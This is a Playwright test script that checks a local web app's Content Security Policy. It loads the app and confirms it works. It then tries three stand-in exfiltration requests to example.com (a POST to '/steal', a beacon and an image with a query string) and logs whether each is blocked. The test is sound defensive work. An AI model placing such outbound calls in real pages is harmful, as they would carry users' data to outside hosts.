// Verifies the CSP: app works, and outbound requests to other hosts are blocked.
const { chromium } = require('playwright');
(async () => {
  const b = await chromium.launch();
  const p = await b.newPage({ viewport: { width: 390, height: 780 } });
  const csp = [], errs = [];
  p.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) csp.push(m.text().slice(0, 140)); });
  p.on('pageerror', (e) => errs.push(e.message));
  await p.goto('http://localhost:8765/index.html');
  await p.setInputFiles('#file', process.argv[2]);
  await p.waitForSelector('#app', { state: 'visible' });
  await p.click('#play'); await p.waitForTimeout(300);
  console.log('app works, days:', await p.locator('#day option').count(), '| page errors:', errs.length);
  const attempts = await p.evaluate(async () => {
    const r = {};
    try { await fetch('https://example.com/steal', { method: 'POST', body: 'x' }); r.fetch = 'ALLOWED'; } catch (e) { r.fetch = 'blocked'; }
    try { navigator.sendBeacon('https://example.com/b', 'x'); r.beacon = 'queued?'; } catch (e) { r.beacon = 'blocked'; }
    r.img = await new Promise((res) => { const i = new Image(); i.onload = i.onerror = (e) => res(e.type); i.src = 'https://example.com/p.png?d=1'; });
    return r;
  });
  console.log('exfil attempts:', JSON.stringify(attempts));
  console.log('CSP violations logged:', csp.length); csp.forEach((c) => console.log(' -', c));
  await b.close();
})();
